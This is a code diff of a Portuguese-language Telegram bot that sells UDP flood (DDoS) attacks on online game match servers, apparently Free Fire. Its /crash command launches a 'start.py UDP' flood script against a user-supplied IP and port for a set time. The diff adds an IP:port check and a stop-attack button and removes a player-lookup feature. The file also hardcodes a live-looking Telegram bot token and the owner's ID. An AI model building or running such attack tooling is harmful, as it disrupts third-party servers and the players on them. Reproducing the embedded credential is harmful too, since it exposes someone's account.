@@ -1,10 +1,8 @@
 import telebot
 import subprocess
-import re
-import requests
-import time
 import json
-from datetime import datetime
+import re
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # Configurações do bot
 BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
@@ -12,11 +10,12 @@ SEU_ID_TELEGRAM = 6430703027
 bot = telebot.TeleBot(BOT_TOKEN)
 processos = {}
 MAX_ATTACKS = 3  # Limite de ataques simultâneos
+ARQUIVO_JSON = "usuarios_autorizados.json"
 
 # Função para carregar usuários autorizados de um arquivo JSON
 def carregar_usuarios():
     try:
-        with open("usuarios_autorizados.json", "r") as f:
+        with open(ARQUIVO_JSON, "r") as f:
             return json.load(f)
     except FileNotFoundError:
         return [SEU_ID_TELEGRAM]  # Adiciona o ID do dono como padrão
@@ -25,7 +24,7 @@ def carregar_usuarios():
 
 # Função para salvar usuários autorizados em um arquivo JSON
 def salvar_usuarios():
-    with open("usuarios_autorizados.json", "w") as f:
+    with open(ARQUIVO_JSON, "w") as f:
         json.dump(authorized_users, f)
 
 # Lista de usuários autorizados
@@ -43,100 +42,28 @@ def manage_attacks():
         oldest_process.terminate()
         del processos[list(processos.keys())[0]]
 
-# Função de ataque contínuo
-def ataque_continuo(ip_porta, tempo=900):
-    for _ in range(tempo // 5):
-        subprocess.Popen(f"python3 start.py UDP {ip_porta} 10 900", shell=True)
-        time.sleep(5)
-    if ip_porta in processos:
-        del processos[ip_porta]
-
 # Comando /menu
 @bot.message_handler(commands=['menu'])
 def menu(message):
-    welcome_text = (
-        "Bem-vindo ao bot! 🚀\n\n"
-        "Aqui estão os comandos disponíveis para você:\n\n"
-        "*Comandos básicos:*\n"
-        "`/crash <IP da partida> [tempo]` - Envia um ataque ao IP especificado. "
-        "(Padrão 900 segundos)\n"
-        "`/meuid` - Mostra seu ID de usuário.\n"
-        "`/info_player <ID>` - Exibe informações de um jogador por ID.\n\n"
-        "*Comandos para o dono do bot:*\n"
-        "`/adduser <ID>` - Adiciona um usuário autorizado.\n"
-        "`/removeuser <ID>` - Remove um usuário autorizado.\n"
-        "`/listusers` - Mostra a lista de usuários autorizados e seus cargos.\n\n"
-        "Quer comprar o bot? Entre em contato comigo no Telegram: "
-        "[werbert_ofc](https://t.me/werbert_ofc)\n\n"
-        "_Se precisar de ajuda, estou à disposição!_ 😉"
-    )
-    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
+    comandos = """
+Comandos disponíveis:
 
-# Comando /info_player
-@bot.message_handler(commands=['info_player'])
-def info_player(message):
-    if len(message.text.split()) < 2:
-        bot.send_message(message.chat.id, "Uso correto: /info_player <ID do jogador>")
-        return
+🔹 /menu - Mostra este menu.
 
-    player_id = message.text.split()[1]
-    url = f"https://api.nowgarena.com/api/info_player?id={player_id}&region=br"
+🔹 /crash <IP da partida> [tempo] - Inicia um ataque na partida por determinado tempo com potência padrão 10 (se tempo não for especificado, será 900 segundos).
 
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            data = response.json()
-            if data["success"]:
-                player_info = data["data"]["PlayerBasicInfo"]
-                nickname = player_info.get("AccountNickname", "Desconhecido")
-                level = player_info.get("AccountLevel", "Desconhecido")
-                exp = player_info.get("AccountExp", "Desconhecido")
-                br_rank = player_info["BRRank"].get("Rank", "Desconhecido")
-                cs_rank = player_info["CSRank"].get("Rank", "Desconhecido")
-                likes = player_info.get("PlayerLikes", "0")
-                last_login = player_info.get("Last_Login_At", "Desconhecido")
-                elite_pass_status = player_info["PlayerElitePass"].get("Status", "Desconhecido")
-                elite_pass_level = player_info["PlayerElitePass"].get("Level", "Desconhecido")
-                weapon_skin_shows = player_info.get("weaponSkinShows", "Nenhuma")
-                # Convertendo o timestamp de "Último Login" para uma data legível
-                if last_login != "Desconhecido":
-                    last_login = datetime.utcfromtimestamp(int(last_login)).strftime('%Y-%m-%d %H:%M:%S')
-                
-                response_text = (
-                    f"**Informações do Jogador:**\n"
-                    f"👤 **Nickname:** {nickname}\n"
-                    f"🎮 **Nível:** {level}\n"
-                    f"⭐ **Experiência:** {exp}\n"
-                    f"🏆 **Rank BR:** {br_rank}\n"
-                    f"⚔️ **Rank CS:** {cs_rank}\n"
-                    f"❤️ **Curtidas:** {likes}\n"
-                    f"📅 **Último Login:** {last_login}\n"
-                    f"🏅 **Elite Pass Status:** {elite_pass_status}\n"
-                    f"🎖️ **Elite Pass Level:** {elite_pass_level}\n"
-                    f"🗡️ **Skin de Arma:** {weapon_skin_shows}\n"
-                )
+🔹 /meuid - Mostra seu id de usuário do telegram.
 
-                # Verificando se "clothes" existe antes de tentar acessar
-                clothes_images = data["data"].get("ProfileInfo", {}).get("clothes", {}).get("images", [])
-                if clothes_images:
-                    response_text += "\n**Roupas equipadas:**\n"
-                    for img in clothes_images:
-                        response_text += f"![Roupas]({img})\n"
+🔹 /adduser <ID> - Adiciona um usuário autorizado (apenas para o dono).
 
-                # Habilidades equipadas
-                equipped_skills = data["data"]["ProfileInfo"].get("equippedSkills", [])
-                if equipped_skills:
-                    response_text += "\n**Habilidades Equipadas:**\n"
-                    for skill in equipped_skills:
-                        response_text += f"- {skill}\n"
+🔹 /removeuser <ID> - Remove um usuário autorizado (apenas para o dono).
 
-                bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
-            else:
-                bot.send_message(message.chat.id, "Jogador não encontrado ou erro na API.")
-        else:
-            bot.send_message(message.chat.id, f"Erro ao consultar a API: {response.status_code}")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"Erro ao fazer a solicitação: {str(e)}")
+🔹 /listusers - Lista os usuários autorizados (apenas para o dono).
+
+Deseja comprar o bot?
+Fale com o @werbert_ofc
+"""
+    bot.send_message(message.chat.id, comandos)
 
 # Comando /crash
 @bot.message_handler(commands=['crash'])
@@ -147,42 +74,66 @@ def crash_server(message):
 
     comando = message.text.split()
     if len(comando) < 2:
-        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida>")
+        bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> [tempo]")
         return
 
     ip_porta = comando[1]
-    tempo = 900  # Padrão 900 segundos
-    potencia = 10  # Padrão 10
+    if not validar_ip_porta(ip_porta):
+        bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
+        return
 
-    # Verificar se o comando inclui o tempo (não é necessário, pois o padrão já é 900)
-    if len(comando) == 3:
+    tempo = 900  # Tempo padrão
+    potencia = 10  # Potência padrão
+
+    if len(comando) > 2:
         try:
             tempo = int(comando[2])
         except ValueError:
             bot.send_message(message.chat.id, "Por favor, insira um tempo válido.")
             return
 
-    # Verificar se o IP já tem um ataque em andamento
     if ip_porta in processos:
         bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}.")
         return
 
-    # Gerenciar o limite de ataques simultâneos
-    if len(processos) >= MAX_ATTACKS:
-        oldest_process = list(processos.values())[0]
-        oldest_process.terminate()
-        del processos[list(processos.keys())[0]]
+    manage_attacks()
 
-    # Enviar comando no formato correto com 10 e 900 como padrão
     comando_ataque = ["python3", "start.py", "UDP", ip_porta, str(potencia), str(tempo)]
     processo = subprocess.Popen(comando_ataque)
     processos[ip_porta] = processo
-    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} com potência {potencia} por {tempo} segundos.")
 
-# Comando /meuid
-@bot.message_handler(commands=['meuid'])
-def send_user_id(message):
-    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")
+    # Criação do botão para parar o ataque
+    markup = InlineKeyboardMarkup()
+    parar_button = InlineKeyboardButton(
+        text="🛑 Parar Ataque",
+        callback_data=f"parar_{ip_porta}"
+    )
+    markup.add(parar_button)
+
+    try:
+        bot.send_message(
+            message.chat.id,
+            f"Ataque iniciado para {ip_porta} com potência {potencia} por {tempo} segundos.",
+            reply_markup=markup
+        )
+    except Exception as e:
+        bot.send_message(message.chat.id, "Erro ao iniciar ataque.")
+        print(f"Erro ao enviar mensagem: {e}")
+
+# Manipulador de callback para parar ataques
+@bot.callback_query_handler(func=lambda call: call.data.startswith("parar_"))
+def parar_ataque(call):
+    ip_porta = call.data.split("_", 1)[1]
+    if ip_porta in processos:
+        processos[ip_porta].terminate()
+        del processos[ip_porta]
+        bot.edit_message_text(
+            chat_id=call.message.chat.id,
+            message_id=call.message.id,
+            text=f"Ataque para {ip_porta} foi parado com sucesso."
+        )
+    else:
+        bot.answer_callback_query(call.id, "Nenhum ataque ativo para este IP.")
 
 # Comando /adduser e /removeuser
 @bot.message_handler(commands=['adduser', 'removeuser'])
@@ -218,6 +169,17 @@ def admin_commands(message):
         else:
             bot.send_message(message.chat.id, "Usuário não encontrado na lista de autorizados.")
 
+# Comando /meuid
+@bot.message_handler(commands=['meuid'])
+def enviar_meu_id(message):
+    # Criação de uma mensagem formatada com o ID
+    meu_id = f"`{message.from_user.id}`"  # Formata o ID em Markdown
+    bot.send_message(
+        message.chat.id,
+        f"Seu ID do Telegram é:\n{meu_id}\n\nClique no ID para copiá-lo!",
+        parse_mode="Markdown"
+    )
+
 # Comando /listusers
 @bot.message_handler(commands=['listusers'])
 def list_users(message):
@@ -233,7 +195,7 @@ def list_users(message):
 
 # Função principal
 def main():
-    bot.polling(none_stop=True)
+    bot.polling(none_stop=True, timeout=60, long_polling_timeout=30)
 
 if __name__ == "__main__":
     main()
